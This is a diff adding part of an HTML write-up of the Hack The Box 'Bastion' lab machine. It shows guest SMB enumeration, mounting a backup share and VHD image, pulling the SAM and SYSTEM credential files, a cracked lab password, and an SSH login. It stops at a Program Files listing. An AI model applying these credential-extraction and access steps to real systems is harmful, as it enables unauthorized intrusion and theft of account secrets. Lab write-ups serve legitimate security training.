@@ -130,7 +130,95 @@ C$ NO ACCESS </br>
 IPC$ READ ONLY </b> </p>
 
 Listing further on that backup dir: </br>
-<b> | root@kek:~/htb/bastion# smbmap -u guest -H 10.10.10.134 -R Backups </b>
+<b> | root@kek:~/htb/bastion# smbmap -u guest -H 10.10.10.134 -R Backups</b>
+	<div class="image main"><img src="bastion2.png" alt="smbmap" /></div>
+
+<p> Interesting enough we got a note.txt and some .vhd files that immediately took my attention; vhd files are virtual hard disks but look at the size ( ͡° ͜ʖ ͡°) </p>
+Let’s look at note.txt
+
+<p><b> |root@kek:~/htb/bastion# cat 10.10.10.134-Backups_note.txt</b> <br>
+		|Sysadmins: please don’t transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
+</p>
+
+<p>Indeed trying to pull out the vhd will take some time, so there’s two options, trying to mount the vhd or pulling the files out first. <br>
+	We are going to try to mount it; </p>
+
+<p>	| root@kek:~/htb/bastion# mkdir /mnt/bastion <br>
+| root@kek:~/htb/bastion# cd /mnt/bastion/ <br>
+|<b> root@kek:/mnt/bastion# mount -t cifs //10.10.10.134/Backups /mnt/bastion -o rw </b><br>
+| Password for root@//10.10.10.134/Backups: <br></p>
+
+<p> | root@kek:/mnt# ls -lah bastion/ <br>
+| total 8.5K <br>
+| drwxr-xr-x 2 root root 4.0K May 25 18:28 . <br>
+| drwxr-xr-x 5 root root 4.0K May 25 18:27 .. <br>
+| drwxr-xr-x 2 root root 0 May 25 18:28 CaShLznVPF <br>
+| drwxr-xr-x 2 root root 0 May 25 18:20 MfNzIPZylH <br>
+| -r-xr-xr-x 1 root root 116 Apr 16 2019 note.txt <br>
+| drwxr-xr-x 2 root root 0 May 25 18:17 pIrubieZcm <br>
+| -rwxr-xr-x 1 root root 0 Feb 22 2019 SDT65CB.tmp <br>
+| drwxr-xr-x 2 root root 0 May 25 18:18 tBNzRnYGJM <br>
+| drwxr-xr-x 2 root root 0 Feb 22 2019 WindowsImageBackup <br> </p>
+
+<p>and we going for the files in the vhd’s.</p>
+
+<p>|root@kek:/mnt/bastion/WindowsImageBackup/L4mpje-PC/Backup 2019–02–22 124351# ls -lah <br>
+|total 5.1G <br>
+|drwxr-xr-x 2 root root 8.0K Feb 22 2019 . <br>
+|drwxr-xr-x 2 root root 4.0K Feb 22 2019 .. <br>
+|-rwxr-xr-x 1 root root 37M Feb 22 2019 9b9cfbc3–369e-11e9-a17c-806e6f6e6963.vhd <br>
+|-rwxr-xr-x 1 root root 5.1G Feb 22 2019 9b9cfbc4–369e-11e9-a17c-806e6f6e6963.vhd <br>
+|-rwxr-xr-x 1 root root 1.2K Feb 22 2019 BackupSpecs.xml <br>
+
+<p> now, how the h*ck we mount those vhd? well, I learned how to using this stackoverflow: https://stackoverflow.com/questions/36819474/how-can-i-attach-a-vhdx-or-vhd-file-in-linux <p>
+
+<p><b>	|root@kek:/mnt/bastion/WindowsImageBackup/L4mpje-PC/Backup 2019–02–22 124351# guestmount — add /mnt/bastion/WindowsImageBackup/L4mpje-PC/Backup\ 2019–02–22\ 124351/9b9cfbc4–369e-11e9-a17c-806e6f6e6963.vhd — inspector — ro /mnt/vhd -v </b></p>
+<div class="image main"><img src="bastion3.png" alt="hey" /></div>
+
+<p>Explored Users and found no flag tho.<br>
+But hey! we got a “Windows\System32\config” dir! <br>
+So we pull both SAM and SYSTEM files. </p>
+<div class="image main"><img src="bastion4.png" alt="lsls" /></div>
+
+<p>Now we got the hash and we need to crack it, either online on some repo or hash cat :) </p>
+
+|The hash will contain the pass bureaulampje <br>
+
+<p>nooow, we got an user and a password. <br>
+	If we go back we could either go back the SMB route or the SSH, since we got a credential to try let’s give SSH a chance:</p>
+
+<p><b>	| root@kek:~/htb/bastion# ssh L4mpje@10.10.10.134 </b> <br>
+	| L4mpje@10.10.10.134’s password:<br>
+	| Microsoft Windows [Version 10.0.14393]<br>
+	| © 2016 Microsoft Corporation. All rights reserved.<br>
+	|<b> l4mpje@BASTION C:\Users\L4mpje>whoami<br></b>
+	| bastion\l4mpje <br>
+
+	And now going directly to \Desktop we’ll find the <b>user.txt</b>
+	<div class="image"><img src="bastion5.png" alt="user" /></div>
+
+<p>	Now we go back to lookup and we have access and whatnot.</p>
+	Let’s see how we can get to root.txt</p>
+<code>Directory of C:\Program Files (x86) <br>
+	22–02–2019 15:01 <"DIR> .<br>
+	22–02–2019 15:01 <"DIR> ..<br>
+	16–07–2016 15:23 <"DIR> Common Files<br>
+	23–02–2019 10:38 <"DIR> Internet Explorer<br>
+	16–07–2016 15:23 <"DIR> Microsoft.NET<br>
+	22–02–2019 15:01 <"DIR> mRemoteNG<br>
+	23–02–2019 11:22 <"DIR> Windows Defender<br>
+	23–02–2019 10:38 <"DIR> Windows Mail<br>
+	23–02–2019 11:22 <"DIR> Windows Media Player<br>
+	16–07–2016 15:23 <"DIR> Windows Multimedia Platform<br>
+	16–07–2016 15:23 <"DIR> Windows NT<br>
+	23–02–2019 11:22 <"DIR> Windows Photo Viewer<br>
+	16–07–2016 15:23 <"DIR> Windows Portable Devices
+	16–07–2016 15:23 <"DIR> WindowsPowerShell <br>
+	0 File(s) 0 bytes <br>
+	14 Dir(s) 11.305.861.120 bytes free<br></code>
+
+
+
 
 
 
@@ -152,6 +240,13 @@ Listing further on that backup dir: </br>
 					</div>
 
 			</div>
+
+			<pre>
+			  <code>
+			    p { color: red; }
+			    body { background-color: #eee; }
+			  </code>
+			</pre>
 
 		<!-- Scripts -->
 			<script src="../../assets/js/jquery.min.js"></script>
